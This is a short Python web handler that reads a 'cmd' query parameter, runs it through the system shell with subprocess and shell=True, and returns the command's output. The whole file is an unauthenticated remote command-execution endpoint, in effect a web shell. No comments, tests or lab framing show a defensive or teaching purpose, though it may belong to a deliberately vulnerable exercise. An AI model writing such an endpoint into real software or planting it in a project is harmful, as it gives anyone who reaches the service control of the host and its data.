import subprocess

def handle(query, state):
    cmd = (query.get("cmd") or [""])[0]
    if not cmd:
        return 400, {"Content-Type": "text/plain"}, "error: cmd parameter required"

    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        output = result.stdout
        if result.stderr:
            output += result.stderr
        return 200, {"Content-Type": "text/plain"}, output
    except subprocess.TimeoutExpired:
        return 500, {"Content-Type": "text/plain"}, "error: command timeout"
    except Exception as e:
        return 500, {"Content-Type": "text/plain"}, "error: " + str(e)
